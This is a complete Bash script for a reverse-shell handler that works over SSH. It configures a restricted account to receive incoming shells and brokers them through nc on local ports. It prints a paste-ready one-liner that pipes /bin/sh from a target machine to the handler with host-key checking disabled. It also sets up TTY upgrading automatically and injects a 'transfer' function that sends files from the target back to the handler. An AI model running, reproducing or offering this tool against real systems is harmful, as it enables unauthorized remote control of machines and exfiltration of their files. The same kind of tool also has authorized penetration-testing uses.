#!/bin/bash

USER=rshell
SCRIPT_PATH="$(pwd)/$0"
HOSTNAME=$(hostname)

usage() {
  cat <<- _EOM_
Usage: $0 [OPTIONS] [-c [-s]|-a <SSH public key>|-r <SSH public key>]
  -c                    Connect to the remote shell endpoint
  -s                    Do not attempt to launch a full TTY when connecting to
                        the remote endpoint
  -a <SSH public key>   Add <SSH public key> to authorized_keys
  -r <SSH public key>   Remove <SSH public key> from authorized_keys
  DEFAULT               Listen for incomming connections

  Options:
      -u <user>   The user under which to configure SSH keys DEFAULT 'rshell'

Run the following command on the remote server to connect the reverse shell:
  mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <SSH private key file> -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" $USER@$HOSTNAME > /tmp/f; rm /tmp/f
_EOM_
}


shellregister() {
  SSHSHELL_PORT=18000

  while :
  do
    SSHSHELL_PIPE_ID="$(echo $SSH_CLIENT | awk '{print $1}')_${SSHSHELL_PORT}"
    [ -f "/tmp/sshshell/${SSHSHELL_PIPE_ID}" ] || break
    SSHSHELL_PORT=$(($SSHSHELL_PORT + 1))
  done

  env > /tmp/sshshell/${SSHSHELL_PIPE_ID}
}

shellunregister() {
  if [ -f /tmp/sshshell/$SSHSHELL_PIPE_ID ]
  then
    rm -f /tmp/sshshell/$SSHSHELL_PIPE_ID
  fi
}

filetransfer() {
  SSH_CLIENT_IP=$(echo $SSH_CLIENT | awk '{print $1}')
  FILENAME=$(echo "$SSH_ORIGINAL_COMMAND" | cut -d" " -f 2- | sed -e 's#/#_#g')
  if [ ! "$FILENAME" ]
  then
    FILENAME="output_$(date +%s)"
  fi
  echo "File transfer mode saving to ${SSH_CLIENT_IP}/${FILENAME}"
  mkdir -p /tmp/sshshell/files/${SSH_CLIENT_IP}/
  cat - > /tmp/sshshell/files/${SSH_CLIENT_IP}/${FILENAME}
}

while getopts "a:r:u:hcs" o; do
  case "${o}" in
    a)
      ADD_SSHPUBKEY=1
      SSHPUBKEY=${OPTARG}
      ;;
    r)
      REMOVE_SSHPUBKEY=1
      SSHPUBKEY=${OPTARG}
      ;;
    u)
      USER=${OPTARG}
      ;;
    c)
      CONNECTION=1
      ;;
    s)
      SIMPLE=1
      ;;
    *)
      usage
      exit 1
      ;;
  esac
done

# Client commands
SSH_COMMAND=$(echo $SSH_ORIGINAL_COMMAND | awk '{print $1}')
if [ "$SSH_COMMAND" = "transfer" ]
then
filetransfer
  exit
fi

if [ "${CONNECTION}" == "1" ]
then
  shellregister
  trap shellunregister EXIT
  nc -vv -n -l -p $SSHSHELL_PORT 127.0.0.1
  exit
fi

# Server commands
mkdir -p /tmp/sshshell/files
chmod -R 777 /tmp/sshshell
if ! id -u $USER 2>&1 > /dev/null
then
  echo "Remote shell user '${USER}' does not exist, exiting..."
  exit
fi

if [ "${ADD_SSHPUBKEY}${REMOVE_SSHPUBKEY}" == "1" ]
then
  if [ -f ${SSHPUBKEY} ]
  then
    SSHPUBKEY=`cat ${SSHPUBKEY}`
  fi

  SSHPUBKEY_ID=`echo ${SSHPUBKEY} | sha1sum | awk '{print $1}'`
  mkdir -p /home/${USER}/.ssh
  AUTHORIZEDKEYS_PATH="/home/${USER}/.ssh/authorized_keys"
  touch ${AUTHORIZEDKEYS_PATH}
  chown $USER:$USER ${AUTHORIZEDKEYS_PATH}
  chmod 600 ${AUTHORIZEDKEYS_PATH}

  if [ "${ADD_SSHPUBKEY}" == "1" ]
  then
    # Add ssh key
    if [ -f ${AUTHORIZEDKEYS_PATH} ]
    then
      if grep -q "$SSHPUBKEY_ID" ${AUTHORIZEDKEYS_PATH}
      then
        echo "SSH public key $USER => $SSHPUBKEY already exists"
        exit
      fi
      EXISTING_SSHPUBKEYS=`cat ${AUTHORIZEDKEYS_PATH}`
    fi
    echo "Adding SSH public key $USER => $SSHPUBKEY"
    echo -e "# SSHREVERSE_${SSHPUBKEY_ID}\nno-agent-forwarding,no-pty,no-port-forwarding,no-user-rc,no-X11-forwarding,command=\"$SCRIPT_PATH -c\" ${SSHPUBKEY}\n${EXISTING_SSHPUBKEYS}" > ${AUTHORIZEDKEYS_PATH}
    cat << _EOM_
Run the following command on the remote server to connect the reverse shell:
  mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i <SSH private key file> -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" $USER@$HOSTNAME > /tmp/f; rm /tmp/f
_EOM_
    exit
  else
    # Remove ssh key
    if [ -f ${AUTHORIZEDKEYS_PATH} ]
    then
      if grep -q "$SSHPUBKEY_ID" ${AUTHORIZEDKEYS_PATH}
      then
        echo "Removing SSH public key $USER => $SSHPUBKEY"
        # AWK foo to remove the ssh public key from the file if it already exists
        SSHPUBKEYS=`cat ${AUTHORIZEDKEYS_PATH} | awk "/${SSHPUBKEY_ID}/ {for (i=0; i<1; i++) {getline}; next} 1"`
        echo -e "$SSHPUBKEYS" > ${AUTHORIZEDKEYS_PATH}
        exit
      fi
    fi
    echo "SSH public key $USER => $SSHPUBKEY does not exists"
    exit
  fi
fi

CONNECTIONS=`ls -1p /tmp/sshshell/ | grep -v /`
CONNECTION_COUNT=$(echo "$CONNECTIONS" | wc -l)
if [ $CONNECTION_COUNT -eq 0 ]
then
  echo "No current connections"
  exit
elif [ $CONNECTION_COUNT -eq 1 ]
then
  SSHSHELL_PIPE_ID=$CONNECTIONS
else
  echo "Choose a connection:"
  INDEX=1
  for CONNECTION in $CONNECTIONS
  do
    echo -e "\t${INDEX}: $CONNECTION"
    INDEX=$(($INDEX + 1))
  done
  echo
  read CHOICE
  if [[ ! "$CHOICE" =~ ^[0-9]+$ ]]
  then
    echo "Not a number '$CHOICE'"
    exit
  fi
  if [ $CHOICE -gt $CONNECTION_COUNT ]
  then
    echo "Invalid connection number '$CHOICE'"
    exit
  fi
  SSHSHELL_PIPE_ID=`ls -1 /tmp/sshshell/ | head -$CHOICE | tail -1`
  echo "You chose ${CHOICE}: $CONNECTION"
fi

echo "Connecting to $SSHSHELL_PIPE_ID..."
SSHSHELL_PORT=`echo $SSHSHELL_PIPE_ID | cut -d _ -f 2`

if [ "${SIMPLE}" == "1" ]
then
  cat << _EOM_
Upgrade to a full TTY:
* Launch a ptty:
  $ python -c 'import pty; pty.spawn("/bin/bash")'
  or
  $ script
* Background the process (Ctrl+z)
* Setup the environment:
  $ stty raw -echo
  $ fg
  $ reset; export SHELL=bash; export TERM=xterm-256color; stty rows `tput lines` columns `tput cols`
_EOM_
  nc -vv 127.0.0.1 $SSHSHELL_PORT
else
  SSH_SERVER_IP=$(cat /tmp/sshshell/$SSHSHELL_PIPE_ID | grep SSH_CONNECTION | head -1 | awk '{print $3}')

  # Attempt to send the commands to upgrade to a full TTY automatically
  stty raw -echo
  cat <(cat << _EOF_
  { script 2>/dev/null ||  python -c 'import pty; pty.spawn("/bin/bash")' || echo No pty available ; exit ; }
_EOF_
  ) <(cat << _EOF_
  reset; export SHELL=bash; export TERM=xterm-256color; stty rows `tput lines` columns `tput cols`
  transfer() { cat \$1 | ssh -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" ${USER}@${SSH_SERVER_IP} transfer "\$1" ; }
  id
_EOF_
  ) - | nc -vv 127.0.0.1 $SSHSHELL_PORT
  reset
fi
